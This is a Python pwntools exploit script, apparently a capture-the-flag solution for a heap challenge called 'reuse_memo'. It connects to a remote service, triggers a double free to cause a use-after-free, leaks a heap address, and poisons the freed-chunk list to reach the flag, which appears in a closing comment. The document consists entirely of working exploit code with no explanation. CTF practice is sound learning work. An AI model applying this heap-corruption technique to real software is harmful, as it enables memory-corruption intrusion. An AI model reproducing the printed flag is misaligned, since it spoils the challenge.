from pwn import *

if len(sys.argv) >1 :
	sh=remote("128.199.104.41",28544)
else:
	sh=process("./reuse_memo")

def a(p):
	gdb.attach(p,"""
		""")

def write(index,memo):
	sh.sendlineafter("ce:","1")
	sh.sendlineafter("ex:",str(index))
	sh.sendlineafter(":D):",str(memo))

def dele(index):
	sh.sendlineafter("ce:","3")
	sh.sendlineafter("dex:",str(index))

def view(index):
	sh.sendlineafter("ce:","2")
	sh.sendlineafter("dex:",str(index))

def get_flag(index):
	sh.sendlineafter("ce:","4")
	sh.sendlineafter("dex?",str(index))

for i in range(2):
	write(i,str(i)*20)

dele(0)
dele(1)
dele(0)

view(1)
sh.recvuntil("Data: ")
leak=sh.recvline()[:-1]
leak=u64(leak.ljust(8,"\x00"))-1
print hex(leak)

write(0,p64(leak))
write(0,'a'*20)
write(0,'a'*20)
get_flag(1)
view(0)
# COMPFEST12{haha_UAF_g000o_Brrrr}
sh.interactive()